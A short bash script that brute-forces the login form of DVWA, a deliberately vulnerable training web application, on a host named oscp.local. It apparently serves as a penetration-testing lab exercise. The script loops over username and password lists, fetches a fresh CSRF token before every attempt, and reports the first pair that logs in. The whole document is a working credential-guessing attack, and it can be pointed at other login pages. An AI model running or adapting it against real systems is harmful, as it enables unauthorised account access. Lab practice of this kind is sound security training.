#!/bin/bash
SUCCESS="You have logged in as 'admin'"
## Password loop
while read -r _PASS; do

    ## Username loop
    while read -r _USER; do
        TOKEN="$(curl -s -c cookie  http://oscp.local/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"
        curl -s -L -b cookie  -d "username=${_USER}&password=${_PASS}&user_token=${TOKEN}&Login=Login" "http://oscp.local/dvwa/login.php" | grep -q "${SUCCESS}"
        if [[ "$?" -eq 0 ]]; then
            echo "Username : ${_USER}"
            echo "Password : ${_PASS}"
            break 2
        # else
        #     echo "${_USER}: ${_PASS}"
        fi

    done < users.txt
done < passwords.txt
